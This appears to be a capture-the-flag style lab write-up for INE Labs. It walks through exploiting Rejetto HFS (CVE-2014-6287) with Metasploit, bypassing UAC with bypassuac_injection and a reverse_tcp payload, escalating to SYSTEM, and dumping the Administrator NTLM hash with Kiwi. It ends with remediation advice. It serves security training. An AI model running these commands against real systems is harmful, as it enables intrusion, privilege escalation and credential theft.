---
title: "UAC Bypass: Memory Injection"
description: "Exploiting Rejetto HFS for a UAC-limited Meterpreter session, then bypassing UAC with the bypassuac_injection module (reflective DLL injection into a Windows-signed process) to get an elevated session, SYSTEM, and the Administrator NTLM hash via Kiwi."
date: 2025-11-16
platform: "INE Labs"
difficulty: "Medium"
tags: ["UAC Bypass", "bypassuac_injection", "Rejetto HFS", "CVE-2014-6287", "Mimikatz", "Kiwi", "Metasploit", "Windows"]
cover: "./photo10.png"
---

# UAC Bypass: Memory Injection

**Classification:** Host & Network Penetration Testing / The Metasploit Framework<br>
**Target:** demo.ine.local (10.2.21.167) — Windows, Rejetto HFS on port 80<br>
**Attacker:** 10.10.49.4 (Kali)<br>
**Flag:** Administrator NTLM hash `f168d9f8e6c5b893b8c4dfa202228235`

## 1. Executive Summary

We exploit **Rejetto HFS** (CVE-2014-6287) for a Meterpreter session running as a user who
is in the Administrators group but UAC-filtered. The `bypassuac_injection` module performs an
in-memory (reflective DLL) bypass — injecting into a Windows-signed process — to return an
elevated session. From there `getsystem` yields SYSTEM and **Kiwi** dumps the Administrator
NTLM hash.

## 2. Recon & Exploitation

```bash
ping -c 4 demo.ine.local
db_nmap -sV 10.2.21.167
services
```

![Ping target](./photo1.png)

![MSF global variables](./photo2.png)

![Nmap scan (1)](./photo3.png)

![services — Rejetto HFS on port 80](./photo4.png)

```bash
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS 10.2.21.167
exploit
```

![Meterpreter session opened](./photo5.png)

## 3. UAC-Limited Context

```bash
getsystem        # fails
```

![getsystem fails](./photo6.png)

```cmd
shell
net users        # includes Administrator
```

![net users — Administrator account](./photo7.png)

The current user is in the **Administrators** group (but UAC-filtered).

![Administrators group membership](./photo8.png)

Confirming an x64 Meterpreter session (needed for the x64 injection).

![x64 Meterpreter session](./photo9.png)

## 4. UAC Bypass (Memory Injection)

```bash
background
use exploit/windows/local/bypassuac_injection
set TARGET "Windows x64"
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set SESSION 2
set LPORT 4433
run
```

The module injects the payload into a process spawned with a Windows Publisher Certificate
and returns an elevated session.

```
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Successfully injected payload in to process: 2680
```

![bypassuac_injection — elevated session](./photo10.png)

## 5. SYSTEM & Hash Dump

```bash
getsystem
getuid           # NT AUTHORITY\SYSTEM
```

![Escalating to SYSTEM](./photo11.png)

```bash
load kiwi
lsa_dump_sam
# Administrator NTLM: f168d9f8e6c5b893b8c4dfa202228235
```

![Kiwi — Administrator NTLM hash](./photo12.png)

## 6. Remediation Recommendations

1. **Set UAC to "Always notify"** (highest level) — `bypassuac_injection` relies on the
   default/auto-elevation behaviour.
2. **Patch/replace Rejetto HFS** (CVE-2014-6287) to prevent the initial RCE.
3. **Protect LSASS/SAM** with Credential Guard and LSA Protection to block Kiwi/Mimikatz.
4. **Apply least privilege** — don't run day-to-day accounts in the Administrators group.
